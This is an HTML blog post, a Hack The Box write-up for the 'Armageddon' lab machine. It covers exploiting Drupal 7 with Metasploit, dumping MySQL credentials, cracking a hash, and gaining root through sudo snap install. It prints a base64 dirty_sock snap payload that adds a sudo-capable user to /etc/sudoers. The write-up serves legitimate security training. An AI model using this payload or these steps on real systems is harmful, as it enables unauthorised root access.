@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="shortcut icon" href="https://ybenel.cf/favicon.ico"/>
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>HTB - Armageddon | Ybenel</title>
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="HTB - Armageddon" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms)." />
+<meta property="og:description" content="Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms)." />
+<meta property="og:site_name" content="Ybenel" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-03-27T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB - Armageddon" />
+<meta name="twitter:site" content="@_ybenel" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","description":"Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms).","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/logo.ico"}},"headline":"HTB - Armageddon","dateModified":"2021-03-27T00:00:00+01:00","datePublished":"2021-03-27T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"/htb/2021/03/27/HTB-Armageddon.html"},"url":"/htb/2021/03/27/HTB-Armageddon.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Ybenel" />
+
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-12S7XTXXWH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-12S7XTXXWH');
+</script>
+
+
+
+
+
+<!-- Google Fonts -->
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open%20Sans|Roboto|Roboto%20Slab|Roboto%20Mono|Dancing%20Script|Noto%20Sans%20SC|Noto%20Sans%20TC|Noto%20Serif%20SC|Noto%20Serif%20TC|Ma%20Shan%20Zheng">
+
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="/assets/css/skin.css">
+
+<!-- Begin selecting skin -->
+
+  <script>
+    const hour = (new Date()).getHours();
+    let filename = "";
+    if (hour >= 5 && hour < 7) {
+      filename = "/assets/css/skin-sunrise.css";
+    } else if (hour >= 7 && hour < 17) {
+      filename = "/assets/css/skin-daylight.css";
+    } else if (hour >= 17 && hour < 19) {
+      filename = "/assets/css/skin-sunset.css";
+    } else {
+      filename = "/assets/css/skin-midnight.css";
+    }
+    const elem = document.createElement("link");
+    elem.setAttribute("rel", "stylesheet");
+    elem.setAttribute("type", "text/css");
+    elem.setAttribute("href", filename);
+    document.getElementsByTagName("head")[0].appendChild(elem);
+  </script>
+
+<!-- End selecting skin -->
+
+<script async src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script>
+
+
+
+
+  </head>
+
+  <body>
+    <div class="site-container">
+      <header class="site-header">
+        <div class="wrapper">
+  <script>
+    function clickSidebarButton() {
+      const elem = document.getElementById("site-sidebar")
+      if (elem.style.display == "none" || elem.style.display == "") {
+        elem.style.display = "block";
+      } else {
+        elem.style.display = "none";
+      }
+    }
+  </script>
+  <a class="site-sidebar-button" onclick="clickSidebarButton()"><i class="far fa-user"></i>
+  </a>
+
+  <a class="site-title" rel="author" href="/">Ybenel</a>
+
+  
+    <nav class="site-nav">
+      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+      <label for="nav-trigger" title="nav-trigger">
+        <span class="menu-icon">
+          <svg viewBox="0 0 18 15" width="18px" height="15px">
+            <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+          </svg>
+        </span>
+      </label>
+
+      <ul class="trigger">
+              <li><a class="" href="/photos/">Photos</a></li>
+            
+              <li><a class="" href="https://music.ybenel.cf">Music</a></li>
+            
+              <li><a class="" href="/about/">About</a></li>
+            
+              <li class="dropdown" href="#">
+                <a href="javascript:void(0)" class="dropbtn">More</a>
+                <div class="dropdown-content">
+                    <a class="" href="/years/">Years</a>
+                    <a class="" href="/categories/">Categories</a>
+                    <a class="" href="/tags/">Tags</a>
+                </div>
+              </li>
+            </ul>
+    </nav>
+  
+</div>
+
+      </header>
+
+      <div class="site-body wrapper">
+        <aside class="site-sidebar" id="site-sidebar">
+          
+            <h3 class="toc-title">Table of Contents</h3>
+<nav class="toc-nav">
+  <ul class="toc">
+  <li><a href="#enumeration">Enumeration</a>
+    <ul>
+      <li><a href="#foothold">Foothold</a></li>
+    </ul>
+  </li>
+  <li><a href="#privilege-escalation">Privilege Escalation</a>
+    <ul>
+      <li><a href="#initial-recon">Initial Recon</a></li>
+    </ul>
+  </li>
+</ul>
+
+</nav>
+
+          
+        </aside>
+        <main class="site-main" id="site-main" aria-label="Content">
+          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+
+    <h1 class="post-title p-name" itemprop="name headline">HTB - Armageddon</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2021-03-27T00:00:00+01:00" itemprop="datePublished">
+        Mar 27, 2021
+      </time>• 
+          <span itemprop="author" itemscope itemtype="http://schema.org/Person">
+            <span class="p-author h-card" itemprop="name">ybenel</span></span></p>
+
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms).</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<ul>
+  <li>We start of with an intense full port scan with nmap.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c"># Nmap 7.91 scan initiated Sat Mar 27 16:47:39 2021 as: nmap -p- --min-rate 10000 -v -oN full_port.nmap 10.129.100.170</span>
+Increasing send delay <span class="k">for </span>10.129.100.170 from 0 to 5 due to 55 out of 183 dropped probes since last increase.
+Warning: 10.129.100.170 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span><span class="nb">.</span>
+Increasing send delay <span class="k">for </span>10.129.100.170 from 640 to 1000 due to 110 out of 366 dropped probes since last increase.
+Nmap scan report <span class="k">for </span>armageddon.htb <span class="o">(</span>10.129.100.170<span class="o">)</span>
+Host is up <span class="o">(</span>0.098s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 40576 closed ports, 24958 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+</code></pre></div></div>
+
+<ul>
+  <li>Then we run another nmap scan to identify what version/service ports are running on.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.91 scan initiated Sat Mar 27 16:48:56 2021 as: nmap -sC -sV -p80 -oN scan.nmap 10.129.100.170</span>
+Nmap scan report <span class="k">for </span>armageddon.htb <span class="o">(</span>10.129.100.170<span class="o">)</span>
+Host is up <span class="o">(</span>0.070s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
+|_http-generator: Drupal 7 <span class="o">(</span>http://drupal.org<span class="o">)</span>
+| http-robots.txt: 36 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+
+</code></pre></div></div>
+
+<ul>
+  <li>Nmap Identifies Port 80 To be running drupal 7 which is an old version and possibly surfring from many RCE’s Exploits .</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/exploits.png" alt="searchsploit_exploits" /></p>
+
+<h3 id="foothold">Foothold</h3>
+<ul>
+  <li>Checking Exploits that <strong>searchploit</strong> showed and from the name of the box it looks like the drupal installation is highly vulnerable to Drupalgeddon2/3 , further tho running <strong>Metasploit</strong> to launch the exploit.</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/metasploit1.png" alt="metasploit1" /></p>
+
+<ul>
+  <li>After Few Moments.</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/msf_worked.png" alt="msf_worked1" /></p>
+
+<h4 id="user-enumeration">User Enumeration</h4>
+<ul>
+  <li>After Getting A foothold on the machine i tried spawning another shell to get a full tty shell ,however the following error is giving .</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/no_tty.png" alt="no_revshell" /></p>
+
+<ul>
+  <li>This concludes that the there’s some sort of firewall blocking it or there’s restrictions that don’t allow such outcoming connections like sandboxed programs in this case apache?.</li>
+  <li>However there’s an allowed connection at port 4444</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/rev_shell.png" alt="rev_shell" /></p>
+
+<ul>
+  <li>Yet trying to spawn a tty results into another issue which confirms this a sandboxed environment .</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/sandboxed.png" alt="sandboxed_box" /></p>
+
+<ul>
+  <li>Let’s get <strong>linpeas</strong> and run it, PS: Since this is a restricted environment we cannot make files executable or get them with any port unless 80.</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/linpeas.png" alt="linpeas_start" /></p>
+
+<ul>
+  <li>Linpeas did find drupal Mysql password</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/linpeas2.png" alt="finding_mysql_creds" /></p>
+
+<ul>
+  <li>Let’s check the full file [/var/www/html/sites/default/settings.php] for mysql username And Password.</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/creds_mysql.png" alt="creds_mysql" /></p>
+
+<ul>
+  <li>Sweet , now let’s connect to mysql and dump what juicy stuff it holds .</li>
+  <li>Reminder, I had issues connecting to mysql directly with mysql client however i did a betterway to get the content of mysql database through mysqldump.</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/mysql_dump.png" alt="mysql_dump" /></p>
+
+<ul>
+  <li>now i can just download it and cat it or import it to my own mysql server.</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/dump_view.png" alt="dump_view" /></p>
+
+<ul>
+  <li>we can see that’s there’s the user <strong>brucetherealadmin</strong> which is a local user , let’s crack its hash and try to ssh with it.</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/crack_hash.png" alt="brute_pass_crack" /></p>
+
+<ul>
+  <li>Great it’s cracked , Now let’s try to ssh into <strong>Bruce</strong> and read the <strong>user.txt</strong></li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/get_user.png" alt="get_user" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="initial-recon">Initial Recon</h3>
+
+<ul>
+  <li>After we got into user <strong>bruce</strong> let’s see if he has any sudo permissions,terms whatever .</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/sudo_int.png" alt="sudo_terms" /></p>
+
+<ul>
+  <li>Looks like he (<strong>bruce</strong>) can install snap packages , This is really interesting .</li>
+  <li>Let’s create a crafted snap package and install it simply it will be just a setuid binary packaged in snap that will get us root , otherway is by overwritten the content of /etc/passwd by adding a root user to it that will can ssh to …. , there’s alot of way tho.</li>
+  <li>There’s few exploits that were made for snapd that allowed installation of malicious crafted snaps , however we don’t need to run those exploits because this version of snap is patched and we have root privileges to install any snap package.</li>
+  <li>
+    <p>So In Order To Create a snap package i had to install an ubuntu vm cuz i’m running arch based os, so i cheated a bit and i didn’t want to run a vm so i used a prepacked snaps from those exploits <a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">link</a></p>
+  </li>
+  <li>i decoded the base64 and wrote it to a file using python
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">base64</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">'''
+aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
+/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
+ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
+TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
+T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
+Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
+ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
+ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
+L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
+b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
+rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
+rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
+AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
+XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
+RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
+AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''</span> <span class="o">+</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">4256</span> <span class="o">+</span> <span class="s">'=='</span><span class="p">)</span>
+<span class="n">d</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="nb">open</span><span class="p">(</span><span class="s">"crafted.snap"</span><span class="p">,</span><span class="s">'wb'</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Then downloaded the file and installed it .</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/inst_run.png" alt="inst_run" /></p>
+
+<ul>
+  <li>Now let’s su to the dirty_sock user we added to /etc/passwd and read the root flag.</li>
+</ul>
+
+<p><img src="https://ybenel.cf/imgs/arma/read_root.png" alt="read_root" /></p>
+
+<p>And That’s it , that’s <strong>Armageddon</strong> hope you enjoyed the writeup take care and i’ll see you all other time.</p>
+
+  </div>
+
+  <footer class="post-footer">
+    
+      <div class="post-meta">
+        <i class="fas fa-folder"></i>
+        <ul class="post-taxonomies post-categories">
+          
+          
+            <li class="post-category">
+              
+              <a href="/categories/#htb">HTB</a>
+            </li>
+          
+        </ul>
+      </div>
+    
+
+    
+      <div class="post-meta">
+        <i class="fas fa-tags"></i>
+        <ul class="post-taxonomies post-tags">
+          
+          
+            <li class="post-tag">
+              
+              <a href="/tags/#easy">easy</a>
+            </li>
+          
+            <li class="post-tag">
+              
+              <a href="/tags/#htb">htb</a>
+            </li>
+          
+            <li class="post-tag">
+              
+              <a href="/tags/#medium">medium</a>
+            </li>
+          
+        </ul>
+      </div>
+    
+
+    <nav class="post-pagination" role="navigation">
+      
+        <a class="post-previous" href="/htb/2021/01/10/HTB-Delivery.html">
+          <i class="fas fa-arrow-left"></i> HTB - Delivery
+
+        </a>
+      
+    
+      
+        <a class="post-next" href="/rawan/2021/04/17/Nawar.html">
+          Special Lyrics
+ <i class="fas fa-arrow-right"></i>
+        </a>
+      
+    </nav>
+  </footer>
+
+  
+  
+</article>
+
+          <footer class="site-footer">
+            <div class="footer-col-wrapper">
+
+  <div class="footer-col">
+    <div class="copyright">
+      
+      
+      
+        <!--  -->
+        
+      
+      
+      <p>Copyright © 2021 Ybenel; All rights reserved.</p>
+      
+    </div>
+    <!-- <p>
+      Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://github.com/ngzhio/jekyll-theme-hamilton">Hamilton</a>
+    </p> -->
+  </div>
+
+  <div class="footer-col">
+    <p>Where Knowledge is peace of cake.</p>
+  </div>
+</div>
+
+          </footer>
+        </main>
+      </div>
+    </div>
+  </body>
+
+</html>
